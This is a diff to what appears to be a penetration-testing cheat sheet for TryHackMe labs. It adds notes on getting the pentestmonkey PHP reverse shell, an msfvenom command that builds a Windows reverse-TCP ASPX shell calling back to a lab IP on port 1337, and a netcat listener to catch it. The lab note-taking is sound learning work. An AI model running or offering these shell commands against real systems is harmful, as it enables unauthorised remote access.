@@ -51,7 +51,36 @@ python2 -m SimpleHTTPServer 81
 
 
 
+## **PHP Reverse Shell**
 
+**Examples**
+
+[daily-bugle.md](../walkthroughs/tryhackme/daily-bugle.md "mention")
+
+&#x20;**Kali**&#x20;
+
+```
+git clone https://github.com/pentestmonkey/php-reverse-shell.git
+```
+
+
+
+## APSX
+
+**Examples**
+
+[relevant.md](../walkthroughs/tryhackme/relevant.md "mention")
+
+**Kali #1**
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.179.48  LPORT=1337 — platform windows -a x64 -f aspx -o shell.aspx
+```
+
+**Kali #2**
+
+<pre><code><strong>rlwrap nc -lvnp 1337
+</strong></code></pre>
 
 
 
